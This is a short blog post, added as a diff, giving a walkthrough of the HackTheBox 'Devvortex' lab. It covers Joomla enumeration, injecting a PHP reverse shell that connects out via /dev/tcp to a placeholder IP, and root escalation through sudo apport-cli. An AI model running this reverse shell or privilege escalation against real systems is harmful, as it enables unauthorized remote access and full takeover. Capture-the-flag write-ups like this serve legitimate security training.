@@ -1,0 +1,73 @@
+---
+layout: post
+title: "Devvortex 8aaf1edae1e645f8a3502c240817c61c"
+date:   2025-07-10 12:05:57 -0400
+categories: writeups
+---
+
+# Devvortex
+
+HackTheBox: Easy
+
+<aside>
+💡 Devvortex is a linux easy machine where we can practice fuzzing, exploiting vulnerabilities exposed, seversing shell’s and hashing.
+
+</aside>
+
+## 1: Enumeration
+
+- Scanning ports
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled.png' | relative_url }})
+
+Let’s look for some subdomains
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_1.png' | relative_url }})
+
+FUZZ some routes
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_2.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_3.png' | relative_url }})
+
+We can see a log in powered by joomla, which has its own scanning tool
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_4.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_5.png' | relative_url }})
+
+Interesting, a version with a vulnerability
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_6.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_7.png' | relative_url }})
+
+## 2: User flag
+
+With this we break into admin interface, we can see a lot of .php files(**System -> Templates -> Administrator Templates.**), we can inject a rev shell
+
+```bash
+system('bash -c"bash -i > & /dev/tcp/10.10.00.000/0000 0>&1"');
+```
+
+We dive into as data, and we can find at /etc/passwod a logan user with creds for sql database
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_8.png' | relative_url }})
+
+We hash and got the user flag
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_9.png' | relative_url }})
+
+## 3: Priv esc
+
+![Untitled]({{ '/assets/images/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7/d25d6a12-05b4-4c8e-b3dd-20d8420b97d1-export-0e5fc15f-de53-40ea-ab02-e6044c5b62e7_Untitled_10.png' | relative_url }})
+
+There is a vulnerability to esc priv we are gonna make it in this way:
+
+```bash
+sleep 60 & (segundo plano)
+sudo /usr/bin/apport-cli -c /var/crash/sleep.0.crash
+view report
+!/bin/bash
+Root...
+```
